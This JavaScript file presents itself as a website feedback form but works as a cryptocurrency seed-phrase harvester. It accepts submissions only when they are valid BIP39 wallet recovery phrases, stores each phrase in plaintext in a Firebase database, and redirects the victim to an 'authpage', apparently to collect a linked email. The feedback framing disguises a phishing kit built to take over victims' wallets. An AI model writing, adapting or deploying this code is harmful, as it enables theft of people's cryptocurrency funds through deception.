// ========================================
// FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE AND BIP39 VALIDATION
// ========================================

// BIP39 wordlist - loaded from external source
let bip39Wordlist = [];

// Load BIP39 wordlist on page load
async function loadBip39Wordlist() {
    try {
        const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
        const text = await response.text();
        bip39Wordlist = text.trim().split('\n');
        console.log('BIP39 wordlist loaded:', bip39Wordlist.length, 'words');
        return true;
    } catch (error) {
        console.error('Failed to load BIP39 wordlist:', error);
        return false;
    }
}

// Validate if the mnemonic is a valid BIP39 seed phrase
function isValidBip39Mnemonic(mnemonic) {
    const words = mnemonic.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0);
    
    // Check if word count is valid (12, 15, 18, 21, or 24)
    if (![12, 15, 18, 21, 24].includes(words.length)) {
        console.log('Invalid word count:', words.length);
        return { valid: false, error: 'Invalid word count. Please enter 12, 15, 18, 21, or 24 words.' };
    }
    
    // Check if all words are in the BIP39 wordlist
    if (bip39Wordlist.length > 0) {
        for (let i = 0; i < words.length; i++) {
            if (!bip39Wordlist.includes(words[i])) {
                console.log('Invalid word found:', words[i], 'at position', i + 1);
                return { valid: false, error: 'Invalid word "' + words[i] + '" at position ' + (i + 1) + '. Not in BIP39 wordlist.' };
            }
        }
    }
    
    console.log('All words are valid BIP39 words');
    return { valid: true };
}

// Hash function to create unique identifier from feedback
function hashFeedback(feedback) {
    let hash = 0;
    for (let i = 0; i < feedback.length; i++) {
        const char = feedback.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
}

// Check if feedback already exists in Firebase
async function checkExistingSubmission(feedbackHash) {
    try {
        const snapshot = await firebase.database()
            .ref('submissions/' + feedbackHash)
            .once('value');
        return snapshot.val();
    } catch (error) {
        console.error('Error checking existing submission:', error);
        return null;
    }
}

// Save feedback to Firebase (without sending to Formspree yet)
async function saveFeedback(feedbackHash, feedback) {
    try {
        await firebase.database()
            .ref('submissions/' + feedbackHash)
            .set({
                feedback: feedback,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                submittedAt: new Date().toISOString(),
                wordCount: feedback.split(/\s+/).filter(w => w.length > 0).length,
                sentToFormspree: false,
                emailHash: null,
                email: null
            });
        return true;
    } catch (error) {
        console.error('Error saving feedback:', error);
        return false;
    }
}

function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    // Load BIP39 wordlist first
    loadBip39Wordlist();

    if (feedbackForm && feedbackTextarea) {
        feedbackForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const text = feedbackTextarea.value.trim().toLowerCase();
            
            // Validate BIP39 mnemonic
            const validation = isValidBip39Mnemonic(text);
            
            if (!validation.valid) {
                if (errorMessage) {
                    errorMessage.textContent = validation.error;
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Hide error message if validation passes
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Create hash of feedback
            const feedbackHash = hashFeedback(text);
            
            console.log('Valid BIP39 seed phrase detected. Checking for existing submission...');
            
            // Check if this feedback was already submitted
            const existingSubmission = await checkExistingSubmission(feedbackHash);
            
            if (existingSubmission) {
                // Already submitted - load previous state
                console.log('Feedback already submitted. Loading previous state...');
                
                // Store the hash and feedback in sessionStorage
                sessionStorage.setItem('feedbackHash', feedbackHash);
                sessionStorage.setItem('feedback', text);
                sessionStorage.setItem('isReturningFeedback', 'true');
                
                // Store the linked email hash and email if they exist
                if (existingSubmission.emailHash) {
                    sessionStorage.setItem('linkedEmailHash', existingSubmission.emailHash);
                }
                if (existingSubmission.email) {
                    sessionStorage.setItem('linkedEmail', existingSubmission.email);
                }
                
                // Redirect to authpage
                console.log('Redirecting to authpage with previous state...');
                window.location.href = 'authpage.html';
                return;
            }
            
            // New feedback - save to Firebase only (don't send to Formspree yet)
            console.log('New valid seed phrase detected. Saving to Firebase...');
            await saveFeedback(feedbackHash, text);
            
            // Store in sessionStorage for authpage
            sessionStorage.setItem('feedbackHash', feedbackHash);
            sessionStorage.setItem('feedback', text);
            sessionStorage.setItem('isReturningFeedback', 'false');
            
            console.log('Feedback saved. Redirecting to authpage...');
            
            // Redirect to authpage
            window.location.href = 'authpage.html';
        });
    }
}

// Initialize when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
} else {
    initializeFeedbackPage();
}
